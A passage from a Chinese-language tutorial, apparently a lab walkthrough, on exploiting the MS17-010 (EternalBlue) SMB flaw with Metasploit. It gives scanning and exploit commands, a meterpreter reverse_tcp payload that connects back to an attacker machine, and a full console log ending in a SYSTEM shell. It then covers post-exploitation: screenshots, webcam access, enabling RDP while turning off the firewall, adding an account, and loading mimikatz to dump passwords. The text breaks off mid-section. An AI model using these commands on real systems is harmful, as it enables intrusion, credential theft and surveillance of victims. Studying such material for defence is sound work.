+search&nbsp;ms17_010&nbsp;#&nbsp;查找漏洞模块的具体路径&nbsp;
+use&nbsp;auxiliary/scanner/smb/smb_ms17_010&nbsp;#&nbsp;调用漏洞扫描模块&nbsp;
+show&nbsp;option&nbsp;#&nbsp;查看模块配置选项&nbsp;
+set&nbsp;RHOST&nbsp;192.168.1.1-254&nbsp;#&nbsp;配置扫描目标&nbsp;
+set&nbsp;THREADS&nbsp;30&nbsp;#配置扫描线程&nbsp;
+run&nbsp;#运行脚本</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这个使用下来，我们发现其实还没有namp 一条命令就搞定了，来的方便。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">五、MSF 漏洞利用过程</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">通过以上所有环境的准备和漏洞扫描主机的发现，接下来使用MSF框架进行MS17-10漏洞的攻击，也就是“几秒”中的事情了，具体使用方法和过程记录如下。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5.1 ms17-010 漏洞利用之MSF使用方法</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">msfconsole&nbsp;#&nbsp;进入MSF&nbsp;框架&nbsp;
+version&nbsp;#&nbsp;确保MSF框架版本在&nbsp;4.14.17以上；&nbsp;
+search&nbsp;ms17_010&nbsp;#&nbsp;漏洞模块路径查询&nbsp;
+set&nbsp;exploit/windows/smb/ms17_010_eternalblue&nbsp;#&nbsp;调用攻击模块
+set&nbsp;RHOST&nbsp;192.168.1.112&nbsp;#&nbsp;设定攻击目标&nbsp;
+exploit&nbsp;#&nbsp;发起攻击</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">5.2	ms17-010 漏洞攻击MSF框架实践记录</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5.2.1 漏洞模块路径查询</span></strong></p><p style="text-align:center"><img src="http://p6.qhimg.com/t0191725159b8a0f52c.png" title="t015a517d3d05afd5dd.png" alt="http://p4.qhimg.com/t015a517d3d05afd5dd.png"/></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5.2.2 调用和配置exploit攻击参数</span></strong></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01d6cf8e8df4d3f385.png" title="t013245a3d4e5affe4e.png" alt="http://p4.qhimg.com/t013245a3d4e5affe4e.png"/></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5.2.3 发起攻击</span></strong></p><p style="text-align:center"><img src="http://p0.qhimg.com/t018b66ef2cc811c7a6.png" title="t018bec0e8c3028abc5.png" alt="http://p5.qhimg.com/t018bec0e8c3028abc5.png"/></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5.2.4 获取shell</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">获取的shell 后，我们可以通过名getuid查看下当前用户的权限。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01dbaffd91722e1bcf.png" title="t015024fba8029017cd.png" alt="http://p4.qhimg.com/t015024fba8029017cd.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">六、维持访问</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里的说到维持访问，主要是想记录下关于使用meterpreter这个攻击载荷模块，我们在利用漏洞的过程中，如果可以使用meterpreter攻击载荷模块，尽量使用这个模块。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">6.1 payload 攻击载荷理论</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">说到这里就就普及下MSF框架下关于“payload”攻击载荷的基本概念，那么什么是payload呢？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">payload又称为攻击载荷，主要是用来建立目标机与攻击机稳定连接的，并返回一个shell，也可以进行程序注入等，payload有3种类型。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（1）singles（独立载荷）&nbsp;</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">独立载荷，可直接植入目标系统并执行相应的程序，如：shell_bind_tcp这个payload。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（2）stagers（传输器载荷）&nbsp;</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">传输器载荷，就是用于目标机与攻击机之间建立稳定的网络连接，与传stages（输体载荷配）合攻击。通常该种载荷体积都非常小，可以在漏洞利用后，方便进行注入，这类载荷功能都非常相似，大致分为bind型和reverse型。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">bind型：需要攻击机主动连接目标端口的；&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">reverse型：目标机会反向连接攻击机，需要提前设定好连接攻击机的ip地址和端口号的配置。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（3）stages（传输体）&nbsp;</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">传输体载荷，如shell，meterpreter等。在stagers建立好稳定的连接后，攻击机将stages传输给目标机，由stagers进行相应处理，将控制权转交给stages。比如得到目标机的shell，或者meterpreter控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由此可见，meterpreter其实就是一个payload，它需要stagers（传输器）和相应的stages（传输体）配合运行，meterpreter是运行在内存中的，通过注入dll文件实现，在目标机硬盘上不会留下文件痕迹，所以在被入侵时很难找到。真因为这点，所以meterpreter非常可靠稳定优秀。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">6.2 payload 攻击载荷理解</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">上面说了这么多，可能大家看起来比较费劲难以理解，其实简单的理解就是说payload攻击载荷有2个大的类型：</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（1） 独立体（single）&nbsp;</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">从这个英文单词single,就可以大概知道这类payload是个独立，单独的意思，其实在结合定义我们就可以看出，攻击载荷一般做两件事情&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一、就是建立目标主机与攻击主机之间的网络连接；&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">二、就是在连接建立的基础上获取目标主机的控制权限，即获取可供操作的shell。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（2）结合体payload&nbsp;</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在理解了一个完整的payload是有两部分组成的基础上，我们可以理解我们这里所说的结合体了，其实就是将原本的single独立体分割为了两个部分：“传输器载荷”与“传输体载荷”（stages &amp; stagers）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">比如“windows/meterpreter/reverse_tcp”是由一个传输器载荷（reverse_tcp）和一个传输体载荷（meterpreter）所组成的，其功能等价于独立攻击载荷“windows/shell_reverse_tcp”</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">6.3 meterpreter 攻击载荷实战</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们这里就使用MS17-010漏洞渗透模块结合meterpreter攻击载荷模块进行一次实战演练,通过永恒之蓝漏洞我们来获取一个meterpreter，顺道看meterpreter功能的强大之处。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其他攻击流程与前面基本相同，唯独多了一个配置 payload攻击载荷的过程，具体配置如下。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">6.3.1 攻击载荷配置过程</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">调用exploit 攻击</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">use&nbsp;exploit/windows/smb/ms17_010_eternalblue&nbsp;
+set&nbsp;rhost&nbsp;192.168.1.112</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">配置攻击载荷</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">set&nbsp;payload&nbsp;windows/x64/meterpreter/reverse_tcp&nbsp;
+set&nbsp;lhost&nbsp;192.168.1.118</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">发起攻击</span><br/></p><pre class="brush:plain;toolbar:false">exploit</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">获取shell</span><br/></p><pre class="brush:plain;toolbar:false">getuid</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">6.3.2 具体实操过程记录</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.msf&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/smb/ms17_010_eternalblue&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;调用ms17-010永恒之蓝漏洞攻击模块
+2.msf&nbsp;exploit(ms17_010_eternalblue)&nbsp;&gt;&nbsp;set&nbsp;rhost&nbsp;192.168.1.112&nbsp;#&nbsp;设定攻击目标&nbsp;192.168.1.112
+3.rhost&nbsp;=&gt;&nbsp;192.168.1.112
+4.msf&nbsp;exploit(ms17_010_eternalblue)&nbsp;&gt;&nbsp;set&nbsp;payload&nbsp;windows/x64/meterpreter/reverse_tcp&nbsp;#&nbsp;调用反弹的攻击载荷&nbsp;
+5.payload&nbsp;=&gt;&nbsp;windows/x64/meterpreter/reverse_tcp
+6.msf&nbsp;exploit(ms17_010_eternalblue)&nbsp;&gt;&nbsp;set&nbsp;lhost&nbsp;192.168.1.118&nbsp;#&nbsp;设定将meterpreter&nbsp;反弹给192.168.1.118
+7.lhost&nbsp;=&gt;&nbsp;192.168.1.118
+8.msf&nbsp;exploit(ms17_010_eternalblue)&nbsp;&gt;&nbsp;show&nbsp;options&nbsp;&nbsp;#&nbsp;查询攻击参数设置
+9.
+10.Module&nbsp;options&nbsp;(exploit/windows/smb/ms17_010_eternalblue):
+11.
+12.&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
+13.&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------
+14.&nbsp;&nbsp;&nbsp;GroomAllocations&nbsp;&nbsp;&nbsp;&nbsp;12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Initial&nbsp;number&nbsp;of&nbsp;times&nbsp;to&nbsp;groom&nbsp;the&nbsp;kernel&nbsp;pool.
+15.&nbsp;&nbsp;&nbsp;GroomDelta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;amount&nbsp;to&nbsp;increase&nbsp;the&nbsp;groom&nbsp;count&nbsp;by&nbsp;per&nbsp;try.
+16.&nbsp;&nbsp;&nbsp;MaxExploitAttempts&nbsp;&nbsp;3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;number&nbsp;of&nbsp;times&nbsp;to&nbsp;retry&nbsp;the&nbsp;exploit.
+17.&nbsp;&nbsp;&nbsp;ProcessName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;spoolsv.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process&nbsp;to&nbsp;inject&nbsp;payload&nbsp;into.
+18.&nbsp;&nbsp;&nbsp;RHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.1.112&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;address
+19.&nbsp;&nbsp;&nbsp;RPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;port&nbsp;(TCP)
+20.&nbsp;&nbsp;&nbsp;VerifyArch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Check&nbsp;if&nbsp;remote&nbsp;architecture&nbsp;matches&nbsp;exploit&nbsp;Target.
+21.&nbsp;&nbsp;&nbsp;VerifyTarget&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Check&nbsp;if&nbsp;remote&nbsp;OS&nbsp;matches&nbsp;exploit&nbsp;Target.
+22.
+23.
+24.Payload&nbsp;options&nbsp;(windows/x64/meterpreter/reverse_tcp):
+25.
+26.&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
+27.&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------
+28.&nbsp;&nbsp;&nbsp;EXITFUNC&nbsp;&nbsp;thread&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Exit&nbsp;technique&nbsp;(Accepted:&nbsp;&#39;&#39;,&nbsp;seh,&nbsp;thread,&nbsp;process,&nbsp;none)
+29.&nbsp;&nbsp;&nbsp;LHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.1.118&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;listen&nbsp;address
+30.&nbsp;&nbsp;&nbsp;LPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4444&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;listen&nbsp;port
+31.
+32.
+33.Exploit&nbsp;target:
+34.
+35.&nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name
+36.&nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----
+37.&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Windows&nbsp;7&nbsp;and&nbsp;Server&nbsp;2008&nbsp;R2&nbsp;(x64)&nbsp;All&nbsp;Service&nbsp;Packs
+38.
+39.
+40.msf&nbsp;exploit(ms17_010_eternalblue)&nbsp;&gt;&nbsp;exploit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;发起攻击
+41.
+42.[*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;192.168.1.118:4444&nbsp;
+43.[*]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Connecting&nbsp;to&nbsp;target&nbsp;for&nbsp;exploitation.
+44.[+]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Connection&nbsp;established&nbsp;for&nbsp;exploitation.
+45.[+]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Target&nbsp;OS&nbsp;selected&nbsp;valid&nbsp;for&nbsp;OS&nbsp;indicated&nbsp;by&nbsp;SMB&nbsp;reply
+46.[*]&nbsp;192.168.1.112:445&nbsp;-&nbsp;CORE&nbsp;raw&nbsp;buffer&nbsp;dump&nbsp;(23&nbsp;bytes)
+47.[*]&nbsp;192.168.1.112:445&nbsp;-&nbsp;0x00000000&nbsp;&nbsp;57&nbsp;69&nbsp;6e&nbsp;64&nbsp;6f&nbsp;77&nbsp;73&nbsp;20&nbsp;37&nbsp;20&nbsp;55&nbsp;6c&nbsp;74&nbsp;69&nbsp;6d&nbsp;61&nbsp;&nbsp;Windows&nbsp;7&nbsp;Ultima
+48.[*]&nbsp;192.168.1.112:445&nbsp;-&nbsp;0x00000010&nbsp;&nbsp;74&nbsp;65&nbsp;20&nbsp;36&nbsp;2e&nbsp;31&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;te&nbsp;6.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+49.[+]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Target&nbsp;arch&nbsp;selected&nbsp;valid&nbsp;for&nbsp;OS&nbsp;indicated&nbsp;by&nbsp;DCE/RPC&nbsp;reply
+50.[*]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Trying&nbsp;exploit&nbsp;with&nbsp;12&nbsp;Groom&nbsp;Allocations.
+51.[*]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Sending&nbsp;all&nbsp;but&nbsp;last&nbsp;fragment&nbsp;of&nbsp;exploit&nbsp;packet
+52.[*]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Starting&nbsp;non-paged&nbsp;pool&nbsp;grooming
+53.[+]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Sending&nbsp;SMBv2&nbsp;buffers
+54.[+]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Closing&nbsp;SMBv1&nbsp;connection&nbsp;creating&nbsp;free&nbsp;hole&nbsp;adjacent&nbsp;to&nbsp;SMBv2&nbsp;buffer.
+55.[*]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Sending&nbsp;final&nbsp;SMBv2&nbsp;buffers.
+56.[*]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Sending&nbsp;last&nbsp;fragment&nbsp;of&nbsp;exploit&nbsp;packet!
+57.[*]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Receiving&nbsp;response&nbsp;from&nbsp;exploit&nbsp;packet
+58.[+]&nbsp;192.168.1.112:445&nbsp;-&nbsp;ETERNALBLUE&nbsp;overwrite&nbsp;completed&nbsp;successfully&nbsp;(0xC000000D)!
+59.[*]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Sending&nbsp;egg&nbsp;to&nbsp;corrupted&nbsp;connection.
+60.[*]&nbsp;192.168.1.112:445&nbsp;-&nbsp;Triggering&nbsp;free&nbsp;of&nbsp;corrupted&nbsp;buffer.
+61.[*]&nbsp;Sending&nbsp;stage&nbsp;(1189423&nbsp;bytes)&nbsp;to&nbsp;192.168.1.112
+62.[*]&nbsp;Meterpreter&nbsp;session&nbsp;1&nbsp;opened&nbsp;(192.168.1.118:4444&nbsp;-&gt;&nbsp;192.168.1.112:49177)&nbsp;at&nbsp;2017-06-07&nbsp;13:42:17&nbsp;+0800
+63.[+]&nbsp;192.168.1.112:445&nbsp;-&nbsp;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+64.[+]&nbsp;192.168.1.112:445&nbsp;-&nbsp;=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+65.[+]&nbsp;192.168.1.112:445&nbsp;-&nbsp;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+66.
+67.meterpreter&nbsp;&gt;&nbsp;getuid&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;查询当前用户权限为SYSTEM,获取到到最高权限
+68.Server&nbsp;username:&nbsp;NT&nbsp;AUTHORITY\SYSTEM
+69.meterpreter&nbsp;&gt;&nbsp;sysinfo&nbsp;&nbsp;&nbsp;#&nbsp;系统信息查询，当前系统为&nbsp;Windows7
+70.Computer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;CHINAMAN-PC
+71.OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Windows&nbsp;7&nbsp;(Build&nbsp;7600).
+72.Architecture&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x64
+73.System&nbsp;Language&nbsp;:&nbsp;zh_CN
+74.Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;WORKGROUP
+75.Logged&nbsp;On&nbsp;Users&nbsp;:&nbsp;0
+76.Meterpreter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x64/windows
+77.meterpreter&nbsp;&gt;</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">6.3.3 meterpreter 功能展现</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（1）桌面抓图&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.	meterpreter &gt; screenshot</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01bc81a356791d7ced.png" title="t01f427baae931daf3b.png" alt="http://p8.qhimg.com/t01f427baae931daf3b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（2）视频开启&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.	meterpreter &gt; webcam_scream</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t019c351d42002bfd35.png" title="t013b383ff26c4652bd.png" alt="http://p0.qhimg.com/t013b383ff26c4652bd.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（3）开启远程桌面&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.	&gt; meterpreter &gt; run post/windows/manage/enable_rdp&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.	此命令可以帮我们一建开启远程桌面，并帮我们关闭防火墙，真的牛xxx.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">注：一开始使用命令 run getgui -u admin -p passw0rd 没能开启远程RDP桌面，后来才查询到上面这个攻击脚本。当然并不是说，就不能用哦。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（4）添加账号&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">直接进入系统shell,添加账号（结果失败）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.&gt;&nbsp;shell
+2.&gt;&nbsp;net&nbsp;user&nbsp;test&nbsp;123&nbsp;/add</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">3.	... # 一直没有回显，怀疑是由于安装了360导致的，后来进过验证的确是这原因，所有说安装个360还是很有用的，不要总是说人家是流氓软件，不是打广告哈,切实感受...</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（5）获取系统管理密码&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">想直接添加账号进行提权，前面操作是不了，那么我们现在就出杀手锏，直接使用mimikatz来获取系统管理账号的密码。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第一步：载入mimikatz</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.	meterpreter &gt; load mimikatz</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第二步：使用命令wdigest获取密码</span></p><p 